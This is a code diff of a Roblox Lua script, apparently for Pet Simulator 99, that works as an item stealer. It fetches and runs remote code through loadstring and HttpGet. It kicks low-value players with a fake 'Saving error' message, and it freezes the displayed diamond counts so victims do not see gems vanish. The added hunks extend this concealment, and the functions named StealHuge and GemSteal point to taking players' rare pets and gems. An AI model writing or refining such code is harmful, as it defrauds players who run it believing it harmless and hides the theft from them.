@@ -3,7 +3,7 @@ LoadScreen = false -- If you want to enable loadgui, rename to true
 
 
 if LoadScreen == true then 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/PS99/main/loadingscreen"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/loadingscreen"))()
 end
 
 local library = require(game.ReplicatedStorage.Library)
@@ -24,7 +24,7 @@ if GemAmount1 < 10000 then
     plr:kick("Saving error, please rejoin!")
 end
 
-AmountOfHuges = 0
+local AmountOfHuges = 0
 for i, v in pairs(save.Pet) do
     local id = v.id
     local dir = library.Directory.Pets[id]
@@ -44,16 +44,19 @@ local user = Username
 
 local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
 local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
-
 gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
 	gemsleftpath.Text = gemsleft
 end)
 
 local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"].Value
 local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"]
-
 gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
 	gemsleaderstatpath.Value = gemsleaderstat
+end)
+
+local loading = game:GetService('StarterGui')._MISC.loading
+loading:GetPropertyChangedSignal("Enabled"):Connect(function()
+	test.Enabled = false
 end)
 
 function StealHuge()
@@ -225,5 +228,4 @@ end
 --while true do
 	--wait(1.25)
 	--GemSteal()
-	--gemsleaderstatpath.Value = gemsleaderstat
 --end
